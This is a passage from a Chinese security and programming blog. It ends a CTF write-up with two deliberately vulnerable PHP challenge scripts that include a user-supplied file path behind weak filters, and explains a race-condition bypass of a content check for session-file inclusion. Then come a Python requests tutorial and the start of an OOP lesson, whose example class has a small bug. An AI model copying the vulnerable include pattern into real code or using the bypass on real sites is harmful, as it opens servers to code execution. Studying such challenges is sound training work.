class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该题会检查 Session 文件中 <code>&lt;</code> 符号是否存在，存在的话它在不在第一个位置。</p>
<p>如果不存在，<code>false</code> 会被转换为整数 <code>0</code> ，最终 <code>strpos($content, &quot;&lt;&quot;) &gt; 0</code> 这个条件判断结果会是 <code>false</code> ，执行 <code>include($file)</code> ；</p>
<p>如果存在但不在第一个位置，会立即结束当前脚本，反之则会继续执行 <code>include($file)</code> 。</p>
<p>但当大量线程上传文件时，不断重写唯一的 Session 的内容，导致可能有一段时间没有 <code>&lt;</code> 符号，绕过检查；但在文件包含时又写入了 Payload ，导致读取到的文件包含恶意代码。</p>
<h2 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;还要秀？&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**<code>set_include_path</code> **：用于设置 PHP 脚本在使用 <code>include</code>、<code>require</code> 等语句包含文件时的优先搜索路径。</p>
<p>因为是优先，找不到还是要去其他路径找，并没有什么用。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" data-id="cma21qgoe0029xwuh82xahhuy" data-title="条件竞争变体题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Python-requests" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/24/Python-requests/" class="article-date">
  <time class="dt-published" datetime="2025-04-24T07:04:47.000Z" itemprop="datePublished">2025-04-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">编程笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/24/Python-requests/">Python-requests</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="requests-库简介"><a href="#requests-库简介" class="headerlink" title="requests 库简介"></a>requests 库简介</h2><p><code>requests</code> 库是 Python 中用于发送 HTTP 请求的常用库，以下通过实例简单介绍一下用法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&#x27;https://www.example.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 GET 请求</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查响应状态码</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="comment"># 打印响应内容</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;响应内容：&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;请求失败，状态码：<span class="subst">&#123;response.status_code&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>requests</code> 库中基于 HTTP 请求方法内置了大量方法，如：</p>
<ul>
<li><code>requests.get(url, params=None, **kwargs)</code>：发送 HTTP GET 请求以从服务器获取资源。</li>
<li><code>requests.post(url, data=None, json=None, **kwargs)</code>：发送 HTTP POST 请求，通常用于向服务器提交数据。</li>
<li><code>requests.put(url, data=None, **kwargs)</code>：发送 HTTP PUT 请求，常用于更新服务器上的资源。</li>
<li><code>requests.delete(url, **kwargs)</code>：发送 HTTP DELETE 请求，用于请求服务器删除指定的资源。</li>
<li><code>requests.head(url, **kwargs)</code>：发送 HTTP HEAD 请求，只返回响应头，不返回响应体。</li>
<li><code>requests.options(url, **kwargs)</code>：发送 HTTP OPTIONS 请求，用于获取服务器支持的请求方法等信息。</li>
<li><code>requests.request(method, url, **kwargs)</code>：通用的请求方法，可根据 <code>method</code> 参数指定的 HTTP 请求方法发送请求。</li>
</ul>
<p>更多方法不再赘述，下面对各方法的参数进行说明：</p>
<h2 id="requests-库各方法的参数与用法"><a href="#requests-库各方法的参数与用法" class="headerlink" title="requests 库各方法的参数与用法"></a>requests 库各方法的参数与用法</h2><h3 id="通用参数（适用于所有HTTP方法）"><a href="#通用参数（适用于所有HTTP方法）" class="headerlink" title="通用参数（适用于所有HTTP方法）"></a>通用参数（适用于所有HTTP方法）</h3><p>所有请求方法（如 <code>get()</code>, <code>post()</code>, <code>put()</code> 等）都支持以下参数：</p>
<ol>
<li><code>url</code> (<strong>必填</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 字符串</p>
</li>
<li><p><strong>作用</strong>: 请求的目标URL。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url=&quot;https://api.example.com/data&quot;)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li><code>params</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 字典、元组列表或字节</p>
</li>
<li><p><strong>作用</strong>: 将参数拼接到<strong>URL</strong>中，形成查询字符串（query string）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;value2&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, params=params)</span><br><span class="line"><span class="comment"># 实际请求URL变为：https://api.example.com/data?key1=value1&amp;key2=value2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li><code>headers</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 字典</p>
</li>
<li><p><strong>作用</strong>: 设置HTTP请求头信息（如User-Agent、Content-Type等）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;my-app/1.0&#x27;</span>, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li><code>timeout</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 浮点数或元组</p>
</li>
<li><p><strong>作用</strong>: 设置请求超时时间（秒）。若服务器在指定时间内未响应，抛出 <code>Timeout</code> 异常。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, timeout=<span class="number">5</span>)          <span class="comment"># 连接+读取总超时5秒</span></span><br><span class="line">response = requests.get(url, timeout=(<span class="number">3</span>, <span class="number">10</span>))    <span class="comment"># 连接3秒，读取10秒</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li><code>auth</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 元组或自定义认证类</p>
</li>
<li><p><strong>作用</strong>: 用于HTTP基本认证（如用户名密码）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth = (<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">response = requests.get(url, auth=auth)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="6">
<li><code>cookies</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 字典或CookieJar对象</p>
</li>
<li><p><strong>作用</strong>: 发送Cookie到服务器。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookies = &#123;<span class="string">&#x27;session_id&#x27;</span>: <span class="string">&#x27;12345abc&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, cookies=cookies)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="7">
<li><code>allow_redirects</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 布尔值</p>
</li>
<li><p><strong>作用</strong>: 是否允许重定向（默认<code>True</code>）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="8">
<li><code>verify</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 布尔值或字符串（证书路径）</p>
</li>
<li><p><strong>作用</strong>: 是否验证SSL证书（默认<code>True</code>）。设为<code>False</code>可跳过验证（不推荐生产环境使用）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, verify=<span class="literal">False</span>)  <span class="comment"># 关闭SSL验证</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="9">
<li><code>proxies</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 字典</p>
</li>
<li><p><strong>作用</strong>: 设置代理服务器。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://10.10.1.10:3128&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://10.10.1.10:1080&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, proxies=proxies)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="10">
<li><code>stream</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 布尔值</p>
</li>
<li><p><strong>作用</strong>: 是否以流模式下载（适合大文件，避免立即加载到内存）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;large_file.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> response.iter_content(<span class="number">1024</span>):</span><br><span class="line">            f.write(chunk)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="针对不同HTTP方法的参数"><a href="#针对不同HTTP方法的参数" class="headerlink" title="针对不同HTTP方法的参数"></a>针对不同HTTP方法的参数</h3><ol>
<li><strong>GET请求：<code>requests.get()</code></strong></li>
</ol>
<ul>
<li><p>主要用于获取数据，参数通过 <strong><code>params</code></strong> 传递。</p>
</li>
<li><p>示例:</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(</span><br><span class="line">    url=<span class="string">&quot;https://example.com/search&quot;</span>,</span><br><span class="line">    params=&#123;<span class="string">&#x27;query&#x27;</span>: <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;page&#x27;</span>: <span class="number">2</span>&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li><strong>POST请求：<code>requests.post()</code></strong></li>
</ol>
<ul>
<li><p>用于提交数据，常用参数：**<code>data</code>**, <strong><code>json</code></strong>, **<code>files</code>**。</p>
</li>
<li><p><code>data</code> 参数:</p>
<ul>
<li>类型: 字典、元组列表、字符串、字节流</li>
<li>作用: 发送表单数据（<code>application/x-www-form-urlencoded</code> ，默认的表单编码格式，适用于提交简单的文本数据）。</li>
<li>示例:</li>
</ul>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;secret&#x27;</span>&#125; <span class="comment"># 字典类型</span></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">data = [(<span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>), (<span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>), (<span class="string">&#x27;vegetable&#x27;</span>, <span class="string">&#x27;carrot&#x27;</span>)] <span class="comment"># 元组列表类型，适用于需要处理多个同名字段或对数据顺序有要求的情况。传参到服务端会把同名参数的值以类似 &quot;fruit&quot;:[&quot;apple&quot;,&quot;banana&quot;] 这样的形式存放。</span></span><br><span class="line">data = <span class="string">&#x27;name=Bob&amp;age=30&#x27;</span> <span class="comment"># 用于传输 URL 编码后的字符串</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>json</code> 参数:</p>
<ul>
<li>类型: 字典</li>
<li>作用: 发送JSON数据（自动设置<code>Content-Type: application/json</code>）。</li>
<li>示例:</li>
</ul>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">json_data = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>&#125;</span><br><span class="line">response = requests.post(url, json=json_data)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>files</code> 参数:</p>
<ul>
<li>类型: 字典</li>
<li>作用: 上传文件（<code>multipart/form-data</code> ，用于上传文件或包含二进制数据的表单）。</li>
<li>示例:</li>
</ul>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;report.pdf&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url, files=files)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li><strong>PUT请求：<code>requests.put()</code></strong></li>
</ol>
<ul>
<li><p>用于更新资源，参数与 <code>post()</code> 相同（<code>data</code>, <code>json</code>, <code>files</code>）。</p>
</li>
<li><p>示例:</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.put(url, json=&#123;<span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;New Title&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li><strong>DELETE请求：<code>requests.delete()</code></strong></li>
</ol>
<ul>
<li><p>用于删除资源，通常不需要请求体。</p>
</li>
<li><p>示例:</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.delete(url)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li><strong>其他方法：<code>head()</code>, <code>options()</code>, <code>patch()</code></strong></li>
</ol>
<ul>
<li>参数与 <code>get()</code> 或 <code>post()</code> 类似，但使用频率较低。</li>
</ul>
<h3 id="高级参数：requests-request"><a href="#高级参数：requests-request" class="headerlink" title="高级参数：requests.request()"></a>高级参数：<code>requests.request()</code></h3><ul>
<li><p>作用: 通用请求方法，可通过 <code>method</code> 参数指定HTTP方法（如<code>GET</code>、<code>POST</code>）。</p>
</li>
<li><p>示例:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.request(method=<span class="string">&#x27;POST&#x27;</span>, url=url, json=data)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="关于-requests-库返回的对象"><a href="#关于-requests-库返回的对象" class="headerlink" title="关于 requests 库返回的对象"></a>关于 requests 库返回的对象</h2><p>在 Python 的 <code>requests</code> 库中，如 <code>response = requests.get(url=url)</code> 返回的是一个 <strong>对象</strong>（属于 <code>requests.models.Response</code> 类）。这个对象包含了 HTTP 请求的所有响应信息，但直接打印 <code>response</code> 并不会显示所有内容，而是会返回一个对象的内存地址表示（例如：<code>&lt;Response [200]&gt;</code>）。</p>
<p>以下是对 <code>response</code> 对象常用属性与方法的介绍：</p>
<h3 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a><strong>常用属性</strong></h3><ol>
<li><strong><code>status_code</code></strong><ul>
<li>HTTP 响应的状态码（如 <code>200</code> 表示成功，<code>404</code> 表示未找到）。</li>
<li>示例：<code>response.status_code</code></li>
</ul>
</li>
<li><strong><code>text</code></strong><ul>
<li>响应内容的字符串形式（自动根据响应编码解码）。</li>
<li>示例：<code>response.text</code></li>
</ul>
</li>
<li><strong><code>content</code></strong><ul>
<li>响应内容的二进制形式（原始字节流）。</li>
<li>示例：<code>response.content</code></li>
</ul>
</li>
<li><strong><code>headers</code></strong><ul>
<li>以字典形式返回响应头（键不区分大小写）。</li>
<li>示例：<code>response.headers[&#39;Content-Type&#39;]</code></li>
</ul>
</li>
<li><strong><code>url</code></strong><ul>
<li>最终请求的 URL（处理重定向后）。</li>
<li>示例：<code>response.url</code></li>
</ul>
</li>
<li><strong><code>encoding</code></strong><ul>
<li>响应的编码格式（可手动修改以修正解码问题）。</li>
<li>示例：<code>response.encoding = &#39;utf-8&#39;</code></li>
</ul>
</li>
<li><strong><code>cookies</code></strong><ul>
<li>服务器返回的 Cookies（<code>RequestsCookieJar</code> 对象）。</li>
<li>示例：<code>response.cookies.get(&#39;session_id&#39;)</code><br>（此处 <code>get()</code> 并非<code>requests.get()</code>，用于从 cookies 中获取指定名称的 cookie 值）</li>
</ul>
</li>
<li><strong><code>history</code></strong><ul>
<li>重定向历史记录（列表形式，按请求顺序排列）。</li>
<li>示例：<code>response.history[0].status_code</code></li>
</ul>
</li>
</ol>
<h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a><strong>常用方法</strong></h3><ol>
<li><strong><code>json()</code></strong><ul>
<li>将 JSON 响应内容解析为 Python 字典&#x2F;列表。</li>
<li>示例：<code>data = response.json()</code></li>
</ul>
</li>
<li><strong><code>raise_for_status()</code></strong><ul>
<li>若状态码为 4xx&#x2F;5xx，抛出异常（用于错误处理）。</li>
<li>示例：<code>response.raise_for_status()</code></li>
</ul>
</li>
</ol>
<h3 id="其他属性"><a href="#其他属性" class="headerlink" title="其他属性"></a><strong>其他属性</strong></h3><ol>
<li><strong><code>request</code></strong><ul>
<li>返回对应的请求对象（包含请求方法、URL、头信息等）。</li>
<li>示例：<code>response.request.method</code></li>
</ul>
</li>
<li><strong><code>elapsed</code></strong><ul>
<li>请求耗时（<code>datetime.timedelta</code> 对象）。</li>
<li>示例：<code>response.elapsed.total_seconds()</code></li>
</ul>
</li>
<li><strong><code>reason</code></strong><ul>
<li>状态码的文本描述（如 <code>200</code> 的 <code>reason</code> 是 <code>OK</code>）。</li>
<li>示例：<code>response.reason</code></li>
</ul>
</li>
<li><strong><code>is_redirect</code></strong><ul>
<li>布尔值，表示是否重定向。</li>
<li>示例：<code>if response.is_redirect: ...</code></li>
</ul>
</li>
<li><strong><code>apparent_encoding</code></strong><ul>
<li>通过内容推断的编码格式（比 <code>encoding</code> 更可靠）。</li>
<li>示例：<code>response.encoding = response.apparent_encoding</code></li>
</ul>
</li>
<li><strong><code>raw</code></strong><ul>
<li>原始响应流（需在请求中设置 <code>stream=True</code>）。</li>
<li>示例：<code>response.raw.read(10)</code></li>
</ul>
</li>
</ol>
<h2 id="其他知识点"><a href="#其他知识点" class="headerlink" title="其他知识点"></a>其他知识点</h2><h3 id="requests-Session"><a href="#requests-Session" class="headerlink" title="requests.Session()"></a><strong>requests.Session()</strong></h3><p>Python 的 <code>requests.Session()</code> 是<strong>客户端的工具</strong>（注意与服务端的 Session 区分），目的是<strong>简化客户端与服务端交互时的状态管理</strong>。它的核心作用是：</p>
<p>**自动管理 Cookies **</p>
<ul>
<li><strong>自动保存</strong>服务端通过 <code>Set-Cookie</code> 返回的所有 Cookies（包括 <code>session_id</code> 等）</li>
<li><strong>自动携带</strong>这些 Cookies 发送后续请求</li>
</ul>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建客户端会话（自动管理 Cookies）</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.服务端返回 Cookie 并自动保存到 Session 中</span></span><br><span class="line">session.post(<span class="string">&quot;https://example.com/login&quot;</span>, data=&#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;123&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.通过 session.get() 这样的形式，自动携带 Cookie（无需手动处理 Cookie 并添加到 header 中）</span></span><br><span class="line">response = session.get(<span class="string">&quot;https://example.com/profile&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>其他功能</strong></p>
<ul>
<li><strong>连接池（Connection Pooling）</strong>：复用 TCP 连接，提升性能</li>
<li><strong>统一配置</strong>：预先设置 Headers、Auth、Proxies 等，适用于所有请求</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/24/Python-requests/" data-id="cma21qgnz0006xwuhh0iqh3s4" data-title="Python-requests" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/requests/" rel="tag">requests</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Python-面向对象入门" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" class="article-date">
  <time class="dt-published" datetime="2025-04-22T13:00:39.000Z" itemprop="datePublished">2025-04-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">编程笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/">Python-面向对象入门</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>来看一个简单的定义类的案例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="comment"># 类属性</span></span><br><span class="line">    species = <span class="string">&#x27;犬科动物&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 方法：返回种类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">whatspecies</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> species</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造函数：创建小狗时必须提供名字和年龄</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name  <span class="comment"># 小狗的名字（属性）</span></span><br><span class="line">        <span class="variable language_">self</span>.age = age    <span class="comment"># 小狗的年龄（属性）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方法：小狗坐下</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> 乖乖坐下了！&quot;</span>)</span><br></pre></td></tr></table></figure>

